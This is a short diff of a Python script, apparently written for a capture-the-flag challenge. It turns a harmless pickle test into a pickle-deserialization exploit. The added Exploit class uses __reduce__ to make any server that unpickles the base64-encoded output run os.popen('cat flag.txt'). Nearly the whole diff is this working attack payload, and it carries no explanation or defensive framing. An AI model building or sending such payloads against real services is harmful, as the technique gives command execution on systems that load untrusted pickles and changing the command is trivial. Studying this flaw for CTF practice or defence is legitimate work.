@@ -2,11 +2,11 @@ import pickle
 import base64
 import os
 
-arr = []
+class Exploit(object):
+    def __reduce__(self):
+        s = 'cat flag.txt'
+        return (os.popen, (s,))
 
-for i in range(100):
-    arr.append("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
-
-exp = pickle.dumps("oke");
+exp = pickle.dumps(Exploit())
 
 print(base64.urlsafe_b64encode(exp))
